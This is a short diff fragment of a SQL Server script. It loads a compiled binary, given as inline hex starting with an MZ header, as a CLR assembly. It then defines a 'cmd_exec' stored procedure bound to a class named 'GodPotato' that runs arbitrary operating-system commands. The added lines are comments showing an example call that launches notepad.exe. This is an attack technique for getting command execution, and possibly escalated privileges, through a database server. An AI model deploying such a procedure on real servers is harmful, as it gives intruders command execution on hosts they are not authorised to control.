@@ -9,3 +9,5 @@ CREATE ASSEMBLY my_assembly FROM 0x4d5a90000300000004000000ffff0000b800000000000
 GO
 CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[GodPotato.StoredProcedures].[cmd_exec];
 GO
+-- Execute the CLR Assembly
+-- EXEC dbo.cmd_exec 'C:\Windows\System32\notepad.exe'
